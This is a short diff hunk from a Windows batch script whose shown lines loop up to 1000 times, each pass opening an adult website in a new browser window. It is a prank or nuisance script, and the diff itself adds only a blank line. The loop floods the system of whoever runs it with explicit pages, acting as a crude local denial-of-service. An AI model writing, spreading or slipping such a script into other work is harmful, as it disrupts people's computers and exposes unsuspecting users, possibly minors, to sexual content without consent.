@@ -10,3 +10,4 @@ start "" "www.sex.com"
 
 set /a count+=1
 if %count% lss 1000 goto open_browser
+
